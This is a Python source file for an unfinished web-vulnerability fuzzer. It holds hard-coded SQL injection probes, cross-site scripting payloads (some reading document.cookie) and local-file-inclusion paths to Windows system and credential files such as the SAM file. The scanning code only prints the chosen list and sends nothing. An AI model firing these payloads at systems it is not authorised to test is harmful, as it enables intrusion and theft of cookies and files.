import argparse, urllib, os, sys

sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
xss = ["';alert(String.fromCharCode(88,83,83))//",
       "\";alert(String.fromCharCode(88,83,83))//",
       "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
       "'';!--\"<XSS>=&{()}",
       "<IMG SRC=\"javascript:alert('XSS');\">",
       "<IMG SRC=javascript:alert('XSS')>",
       "<IMG SRC=JaVaScRiPt:alert('XSS')>",
       "<IMG SRC=`javascript:alert(\"Test, 'XSS'\")`>",
       "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
       "<a onmouseover=alert(document.cookie)>xxs link</a>",
       "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
       "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"]
lfi = ["C:\boot.ini",
       "C:\WINDOWS\win.ini",
       "C:\WINNT\win.ini",
       "C:\WINDOWS\Repair\SAM",
       "C:\WINDOWS\php.ini",
       "C:\WINNT\php.ini",
        "C:\Program Files\Apache Group\Apache\conf\httpd.conf",
        "C:\Program Files\Apache Group\Apache2\conf\httpd.conf",
        "C:\Program Files\\xampp\apache\conf\httpd.conf",
        "C:\php\php.ini",
        "C:\php5\php.ini",
        "C:\php4\php.ini",
        "C:\apache\php\php.ini",
        "C:\\xampp\apache\bin\php.ini",
        "C:\home2\bin\stable\apache\php.ini",
        "C:\home\bin\stable\apache\php.ini",
        "C:\Program Files\Apache Group\Apache\logs\access.log",
        "C:\Program Files\Apache Group\Apache\logs\error.log",
        "C\WINDOWS\TEMP\\",
        "C\php\sessions\\",
        "C:\php5\sessions\\",
        "C:\php4\sessions\\"]
rfi = []
rce = []

def clearScreen():
    if sys.platform == 'win32':os.system('cls')
    else:os.system('clear')
    print('''
                         __        __   	 ____       ____
       ____  ____  _____/ /___  __/ /__ 	 )   \     /   (
      / __ \/ __ \/ ___/ __/ / / / / _ \	  )_  \_V_/  _(
     / / / / /_/ / /__/ /_/ /_/ / /  __/	    )__   __(   
    /_/ /_/\____/\___/\__/\__,_/_/\___/	               `-'
    ''')

def get():
    i = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
    if i=="1":atk = sqli
    elif i=="2":atk = xss
    elif i=="3":atk = lfi
    elif i=="4":atk = rfi
    elif i=="5":atk = rce
    for i in atk:
        r = 1
    print(atk)

def post():
    print("POST functionality not yet developed.")

def cookie():
    print("COOKIE functionality not yet developed.")

parser = argparse.ArgumentParser()

parser.add_argument('-m', '--method', dest='method', help='get, post, or cookie')
parser.add_argument('-u', '--url', dest='url', help='url to target')
parser.add_argument('-p', '--parameter', dest='parameter', help='parameter to use')
parser.add_argument('-d', '--data', dest='data', help='data to use for post or cookie module', default=None)

args = parser.parse_args()

clearScreen()

try:
    if args.method.lower() == 'get':get()
    elif args.method.lower() == 'post':post()
    elif args.method.lower() == 'cookie':cookie()
except:
    parser.print_help()
